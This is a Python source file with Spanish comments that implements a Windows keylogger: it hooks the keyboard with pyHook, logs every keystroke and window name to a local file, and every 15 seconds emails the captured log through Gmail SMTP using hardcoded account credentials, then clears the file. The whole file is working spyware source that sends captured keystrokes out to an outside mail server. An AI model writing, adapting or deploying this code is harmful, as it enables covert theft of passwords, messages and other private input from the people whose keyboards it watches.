import pyHook, pythoncom, sys, logging                              #logging > libreria para registrar el historial de eventos logging > registra las acciones durante la ejecucción del programa
import time, datetime                                               #librerias necesarias para las fechas y horas

carpeta_destino= "C:\\Users\\fonse\\Desktop\\Keylogger\\Logs.txt"  #introducimos la ruta del archivo que almacenara lo que se escriba (utilizar las barras dobles "\\", si no no lo reconocerá)
segundos_Espera= 15                                                 #tiempo de espera para mandar el correo
timeout = time.time() + segundos_Espera                             #calcúlamos un nuevo timeout con el tiempo de espera configurado

def TimeOut():                                                      #método timeout para saber si ya ha pasado el tiempo de espera y toca mandar un correo
    if time.time() > timeout:                                       #comparamos el tiempo actual con el tiempo 
        return True                                                 #si el timeout es menor devolvemos true (mandamos correo)
    else:
        return False                                                #si el timeout es mayor devolvemos false (no mandamos correo)

def crearEmail(user, passw, recep, subj, body):                     #cremamos el email pasándole los parámetros necesarios
    import smtplib                                                  #importamos la librería del protocolo de correo
    mailUser=user                                                   #correo para iniciar sesión
    mailPass=passw                                                  #contraseña del usuario
    From=user                                                       #emisor del correo
    To= recep if type(recep) is list else [recep]                   #ajustamos por si queremos más de 1 destinatario
    Subject=subj                                                    #asunto
    Txt=body                                                        #cuerpo del correo

    email =  """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)      #formato del email
    try:
        server= smtplib.SMTP("smtp.gmail.com", 587)                 #configuramos el servidor de correo para smtp junto al puerto - en este caso usamos GMAIL
        server.ehlo()                                               #protocolo del smtp
        server.starttls()                                           #iniciamos el protocolo TLS (Transport Layer Security para tener unaconexión segura)
        server.login(mailUser, mailPass)                            #hacemos login
        server.sendmail(From, To, email)                            #envíamos el email
        server.close()                                              #cerramos la conexión con el servidor
        print ('Correo enviado!!')                                  #éxito al enviar el correo
    except:
        print ('Fallo al enviar el correo')                         #fracaso al enviar el correo

def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:                         #abrimos el fichero y con la cláusula "r+", al acabar se cerrará el fichero automáticamente.
        fecha=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read()                                               #leemos el fichero
        data= data.replace('Space', ' ')                            #reemplazamos en el fichero las palabras Space por espacios "de verdad" ósea: "   "
        data = data.replace('\n', '')                               #reemplazamos los "intros" para que nos quede todo el texto en la misma línea
        data = 'Log capturado a las: ' + fecha + '\n' + data        #texto que se incluirá en el cuerpo del mensaje
        print(data)                                                 #mostramos lo que se mandará por el mensaje
        crearEmail('pruebaKeylogger@gmail.com', 'prueba123', 'pruebaKeylogger@gmail.com',  #llamamos al método crear email
                  'Nuevo Log -' +fecha, data)

        f.seek(0)                                                   #poner el puntero al principio
        f.truncate()                                                #limpiamos el archivo
        


def OnKeyboardEvent(event):                                                                     #este método se activa al pulsar una tecla del teclado
    
    print ('WindowName:',event.WindowName)                                                      #muestra por pantalla las ventana de windows dónde tecleamos                        
    print ('Key:', event.Key)                                                                   #muestra por pantalla las teclas que se pulsan
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')    #configuramos la carpeta destino y formato del mensaje
    logging.log(10,  event.Key)                                                                 #escribimos en el fichero las teclas capturadas, el parámetro 10 significa que estamos a nivel debug
    return True


hooks_manager = pyHook.HookManager()                                    #creamos el gestor de eventos del teclado
hooks_manager.KeyDown = OnKeyboardEvent                                 #llamamos o activamos la función onKeyBoardEvent que monitoriza cuando se pulsan las teclas (KeyDown)
hooks_manager.HookKeyboard()                                            #comienza a "vigilar" las teclas que se pulsan

while True:                                                             #bucle para mandar el correo, se ejecuta siempre
    if TimeOut():                                                       #llamamos al método TimeOut para ver si toca mandar correo, tiene que devolver un true
        EnviarEmail()                                                   #si devuelve un true, se llama al método de enviar email
        timeout = time.time() + segundos_Espera                         #calcúlamos un nuevo timeout con el tiempo de espera configurado

    pythoncom.PumpWaitingMessages()                                     #ejecuta los registros que están en espera
        